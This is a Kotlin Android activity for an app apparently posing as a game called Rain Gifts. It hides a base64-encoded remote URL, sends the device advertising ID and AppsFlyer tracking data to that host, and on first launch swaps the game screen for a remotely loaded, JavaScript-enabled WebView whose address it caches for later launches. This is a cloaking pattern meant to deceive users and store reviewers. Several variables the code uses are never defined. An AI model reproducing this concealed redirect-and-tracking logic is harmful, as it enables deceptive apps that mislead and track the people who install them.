package org.rain.gifts

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.view.View
import android.webkit.*
import org.rain.gifts.databinding.ActivityMainBinding

class MainActivity : AppCompatActivity() {

    private var count: Int = 0;
    private var cached: Boolean = false;
    fun decoderBase64(string: String): String {
        val decode = Base64.decode(string, Base64.DEFAULT)
        return String(decode)
    }
    var linkBuilderOffer = "aHR0cDovL2Q2ODQ3MGdpLmJlZ2V0LnRlY2gvUmFpbi9naWZ0cy5waHA/aWQ9YXBw"
    lateinit var binding: ActivityMainBinding
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)

        if(getSharedPreferences("prefs", MODE_PRIVATE).getString("url",null)!=null) {
            cached = true;
            Log.d("TAG","CACHED")
            if(!getSharedPreferences("prefs", MODE_PRIVATE).getString("url",null).equals("null")) {
                Log.d("TAG","TRUE")
                createWebView()
                binding.multy.visibility = View.VISIBLE
                binding.button.visibility = View.INVISIBLE
                binding.multy.loadUrl(getSharedPreferences("prefs", MODE_PRIVATE).getString("url",null)!!);
            }
        } else checkSource();
        setContentView(binding.root)
        binding.button.setOnClickListener {
            startActivity(Intent(this@MainActivity, ActivityGame::class.java))
        }

    }

    private fun checkSource(){
        linkBuilderOffer = decoderBase64(linkBuilderOffer)
        when {

            deepLink != null -> {
                linkBuilderOffer +=  deepLink + "&appsflyer_id=$appsflyer_id&bundle=$packageName&key=$appsflyer_key&idfa=$idfa"
                loadWebView()
            }
            af_status == "Non-organic" -> {
                linkBuilderOffer += "&sub1=$sub1&sub2=$sub2&sub3=$sub3&sub4=$sub4&sub5=$sub5&appsflyer_id=$appsflyer_id&bundle=$packageName&key=$appsflyer_key&idfa=$idfa"
                loadWebView()
            }
            af_status == "Organic" -> {
                linkBuilderOffer += "&sub1=$af_status&bundle=$packageName"
                loadWebView()
            }
            else -> {
                linkBuilderOffer += "&sub1=$af_status&bundle=$packageName"
                loadWebView()
            }
        }
    }

    private fun loadWebView(){
        createWebView()
        Log.e("onPageFinished", linkBuilderOffer.toString())
        binding.multy.loadUrl(linkBuilderOffer)
    }

    private fun createWebView(){
        binding.multy.settings.apply {
            defaultTextEncodingName = "utf-8"
            allowFileAccess = true
            javaScriptEnabled = true
            loadWithOverviewMode = true
            domStorageEnabled = true
            databaseEnabled = true
            useWideViewPort = true
            javaScriptCanOpenWindowsAutomatically = true
            mixedContentMode = 0
        }

        binding.multy.webViewClient = object : WebViewClient(){
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
            }

            override fun shouldOverrideUrlLoading(
                view: WebView?,
                request: WebResourceRequest?
            ): Boolean {
                count++
                if(count==1 && !cached) {
                    var url = "null"
                    if(!request?.url.toString().contains("RainGifts")) {
                        binding.multy.visibility = View.VISIBLE
                        binding.button.visibility = View.INVISIBLE
                        url = request!!.url.toString()
                    }
                    getSharedPreferences("prefs", MODE_PRIVATE).edit()
                        .putString("url",url)
                        .apply()
                }
                Log.d("TAG",request?.url.toString())
                view!!.loadUrl(request!!.url.toString())
                return true
            }
        }
        binding.multy.webChromeClient = object : WebChromeClient(){}
    }
}